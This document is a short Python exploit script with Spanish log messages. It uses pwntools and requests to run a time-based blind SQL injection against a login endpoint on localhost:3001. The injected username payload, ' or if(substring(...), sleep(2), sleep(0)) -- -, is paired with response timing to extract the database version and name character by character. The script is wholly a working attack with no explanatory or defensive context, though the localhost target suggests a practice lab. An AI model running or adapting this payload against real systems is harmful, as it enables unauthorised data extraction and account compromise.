from pwn import *
import requests, time, string, json

url = "http://localhost:3001/api/login"
characters = string.ascii_lowercase + string.digits + '._-+'

def make_request():
    data = ""

    p1 = log.progress("Blind SQLi - Fuerza Bruta")
    p1.status("Iniciando prueba")

    p2 = log.progress("Data")

    headers = {
    'Content-Type': 'application/json'
    }

    object_data = ["version()","database()"]

    for obj_data in object_data:
        for position in range(1,27):
            for character in characters:
                login = {
                    "username": "' or if(substring(%s,%d,1) = '%s', sleep(2), sleep(0)) -- -" % (obj_data, position, character),
                    "password": ""
                }

                time_start = time.time()
                request = requests.post(url, headers=headers, data=json.dumps(login))
                time_end = time.time()

                if time_end - time_start > 2:
                    data += character
                    p2.status(data)
                    break
        data += " | "

if __name__ == '__main__':
    try:
        make_request()
    except KeyboardInterrupt:
            print("\n[-] Saliendo\n")